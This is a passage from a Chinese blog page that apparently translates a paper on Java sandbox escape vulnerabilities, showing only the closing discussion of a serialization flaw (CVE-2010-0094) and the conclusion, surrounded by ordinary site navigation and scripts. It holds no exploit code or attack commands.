id="4-4-3-讨论"><a href="#4-4-3-讨论" class="headerlink" title="4.4.3 讨论"></a>4.4.3 讨论</h5><p>　　此漏洞表明序列化协议的特性（仅调用特定构造函数）可以与易受攻击的系统代码一起利用，该代码在特权上下文中对分析师控制的数据进行反序列化，以绕过沙箱并运行任意代码。由于序列化协议由于向后兼容性原因而无法轻松修改，因此已修补易受攻击的代码。</p><h3 id="5-结论"><a href="#5-结论" class="headerlink" title="5 结论"></a>5 结论</h3><p>　　在本文中，我们专注于Java平台的复杂安全模型，该模型已经被攻击了大约20年。我们展示了该平台包含本机组件（如Java虚拟机），以及大量Java系统类（JCL），并且对系统的两个部分进行了广泛的不同攻击。这包括低级攻击，例如内存损坏漏洞，以及对策略实施的Java级攻击，例如可信方法链攻击。这突出了保护平台实际使用的任务是多么困难。<br>　　我们将本文作为案例研究进行了介绍，以说明诸如Java平台之类的复杂系统如何安全地包含潜在恶意代码的执行。希望这篇对过去Java漏洞利用的概述提供了有助于我们在未来设计更强大系统的见解。</p></div><div></div><div><div><div style="text-align:center;color:#555;font-size:14px">-------------End-------------</div></div></div><div><div style="padding:10px 0;margin:20px auto;width:90%;text-align:center"><div>Thank you very much for your donation.</div> <button id="rewardButton" disable="enable" onclick='var qr=document.getElementById("QR");"none"===qr.style.display?qr.style.display="block":qr.style.display="none"'> <span>打赏</span></button><div id="QR" style="display:none"><div id="wechat" style="display:inline-block"> <img id="wechat_qr" src="/images/wechatpay.png" alt=" 微信支付"><p>微信支付</p></div><div id="alipay" style="display:inline-block"> <img id="alipay_qr" src="/images/alipay.png" alt=" 支付宝"><p>支付宝</p></div><div id="bitcoin" style="display:inline-block"> <img id="bitcoin_qr" src="/images/bitcoin.png" alt=" 比特币"><p>比特币</p></div></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/Java沙箱逃逸/" rel="tag"><i class="fa fa-tag"></i> Java沙箱逃逸</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/Security/安全培训大纲/" rel="next" title="安全培训大纲"><i class="fa fa-chevron-left"></i> 安全培训大纲</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"></div></div></footer></div></article></div></div><div class="comments" id="comments"><div id="lv-container" data-id="city" data-uid="MTAyMC8zODM5Mi8xNDkyMA=="></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span><span class="sidebar-toggle-line sidebar-toggle-line-middle"></span><span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-2020224399094607" data-ad-slot="5456418301" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap"> 文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap"> 站点概览</li></ul><section class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" src="/images/diyz.jpg" alt=""><p class="site-author-name" itemprop="name"></p><p class="site-description motion-element" itemprop="description"></p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">27</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/index.html"><span class="site-state-item-count">5</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/index.html"><span class="site-state-item-count">18</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a rel="external nofollow" href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1321425651" target="_blank" title="QQ" rel="external nofollow"><i class="fa fa-fw fa-qq"></i> QQ</a></span><span class="links-of-author-item"><a rel="external nofollow" href="mailto:1321425651@qq.com" target="_blank" title="E-Mail" rel="external nofollow"><i class="fa fa-fw fa-envelope"></i> E-Mail</a></span><span class="links-of-author-item"><a rel="external nofollow" href="https://github.com/doubiduo" target="_blank" title="GitHub" rel="external nofollow"><i class="fa fa-fw fa-github"></i> GitHub</a></span><span class="links-of-author-item"><a rel="external nofollow" href="https://steamcommunity.com/id/doubiduo" target="_blank" title="Steam" rel="external nofollow"><i class="fa fa-fw fa-steam"></i> Steam</a></span><span class="links-of-author-item"><a rel="external nofollow" href="https://www.diyz.bid/atom.xml" target="_blank" title="RSS" rel="external nofollow"><i class="fa fa-fw fa-rss"></i> RSS</a></span></div></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-简介"><span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-背景"><span class="nav-text">2. 背景</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-Java沙箱漏洞简史"><span class="nav-text">2.1 Java沙箱漏洞简史</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-Java平台"><span class="nav-text">2.2 Java平台</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-安全管理"><span class="nav-text">2.3 安全管理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-doPrivileged方法"><span class="nav-text">2.4 doPrivileged方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-内存腐败漏洞"><span class="nav-text">3. 内存腐败漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-类型混乱"><span class="nav-text">3.1 类型混乱</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-1-背景"><span class="nav-text">3.1.1 背景</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-2-示例：CVE-2017-3272"><span class="nav-text">3.1.2 示例：CVE-2017-3272</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-3-讨论"><span class="nav-text">3.1.3 讨论</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-整数溢出"><span class="nav-text">3.2 整数溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-1-背景"><span class="nav-text">3.2.1 背景</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-2-示例：CVE-2015-4843"><span class="nav-text">3.2.2 示例：CVE-2015-4843</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-3-讨论"><span class="nav-text">3.2.3 讨论</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Java级漏洞"><span class="nav-text">4 Java级漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-混淆代理"><span class="nav-text">4.1 混淆代理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#4-1-1-背景"><span class="nav-text">4.1.1 背景</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-1-2-示例：CVE-2012-4681"><span class="nav-text">4.1.2 示例：CVE-2012-4681</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-1-3-讨论"><span class="nav-text">4.1.3 讨论</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-未初始化的实例"><span class="nav-text">4.2 未初始化的实例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#4-2-1-背景"><span class="nav-text">4.2.1 背景</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-2-2-示例：CVE-2017-3289"><span class="nav-text">4.2.2 示例：CVE-2017-3289</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-2-3-讨论"><span class="nav-text">4.2.3 讨论</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-3-可信方法链"><span class="nav-text">4.3 可信方法链</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#4-3-1-背景"><span class="nav-text">4.3.1 背景</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-3-2-示例：CVE-2010-0840"><span class="nav-text">4.3.2 示例：CVE-2010-0840</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-3-3-讨论"><span class="nav-text">4.3.3 讨论</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-4-序列化"><span class="nav-text">4.4 序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#4-4-1-背景"><span class="nav-text">4.4.1 背景</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-4-2-示例：CVE-2010-0094"><span class="nav-text">4.4.2 示例：CVE-2010-0094</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-4-3-讨论"><span class="nav-text">4.4.3 讨论</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-结论"><span class="nav-text">5 结论</span></a></li></ol></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2018</span><span class="with-love" id="animate"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">doubiduo</span></div><div class="powered-by">由 <a rel="external nofollow" class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> 强力驱动</div><div class="theme-info"><div class="powered-by"></div> <span class="post-count">全站共188.4k字</span></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script><script type="text/javascript">!function(e,t){var n,c=e.getElementsByTagName(t)[0];"function"!=typeof LivereTower&&((n=e.createElement(t)).src="https://cdn-city.livere.com/js/embed.dist.js",n.async=!0,c.parentNode.insertBefore(n,c))}(document,"script")</script><script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script><script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script><script>AV.initialize("auf5TIy4OQOv6c52DIqTOgHd-gzGzoHsz","tBf3kX7KmYaId0Nh4PlLx3XQ")</script><script>function showTime(e){var t=new AV.Query(e),c=[],u=$(".leancloud_visitors");u.each(function(){c.push($(this).attr("id").trim())}),t.containedIn("url",c),t.find().done(function(e){var t=".leancloud-visitors-count";if(0!==e.length){for(var n=0;n<e.length;n++){var o=e[n],i=o.get("url"),s=o.get("time"),r=document.getElementById(i);$(r).find(t).text(s)}for(n=0;n<c.length;n++){i=c[n],r=document.getElementById(i);var l=$(r).find(t);""==l.text()&&l.text(0)}}else u.find(t).text(0)}).fail(function(e,t){console.log("Error: "+t.code+" "+t.message)})}function addCount(i){var e=$(".leancloud_visitors"),s=e.attr("id").trim(),r=e.attr("data-flag-title").trim(),t=new AV.Query(i);t.equalTo("url",s),t.find({success:function(e){if(0<e.length){var t=e[0];t.fetchWhenSave(!0),t.increment("time"),t.save(null,{success:function(e){$(document.getElementById(s)).find(".leancloud-visitors-count").text(e.get("time"))},error:function(e,t){console.log("Failed to save Visitor num, with error message: "+t.message)}})}else{var n=new i,o=new AV.ACL;o.setPublicReadAccess(!0),o.setPublicWriteAccess(!0),n.setACL(o),n.set("title",r),n.set("url",s),n.set("time",1),n.save(null,{success:function(e){$(document.getElementById(s)).find(".leancloud-visitors-count").text(e.get("time"))},error:function(e,t){console.log("Failed to create")}})}},error:function(e){console.log("Error:"+e.code+" "+e.message)}})}$(function(){var e=AV.Object.extend("Counter");1==$(".leancloud_visitors").length?addCount(e):1<$(".post-title-link").length&&showTime(e)})</script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script></body></html>